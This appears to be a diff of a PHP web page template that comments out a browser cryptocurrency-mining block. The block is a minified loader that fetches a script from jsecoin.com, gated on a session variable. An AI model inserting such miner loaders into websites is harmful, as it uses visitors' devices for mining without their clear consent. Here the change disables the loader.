@@ -157,12 +157,12 @@ Please try upgrading to a newer browser, such as Firefox, Un-Googled Chromium, E
 <!-- Lodash -->
 <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.10/lodash.min.js"></script>
       <!-- Scripts -->
-      <!-- COIN MINING -->
+      <!-- COIN MINING
       <script type="text/javascript">
         <?php if (!isset($_SESSION['mine'])) { echo '/*'; } ?>
 !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/65484/edxt.net/0/0/",s.parentNode.insertBefore(t,s)}();
    <?php if (!isset($_SESSION['mine'])) { echo '*/'; } ?>
-</script>
+</script>-->
       <script src="script.js?v=<?php echo time(); ?>"></script>
 <script>
 
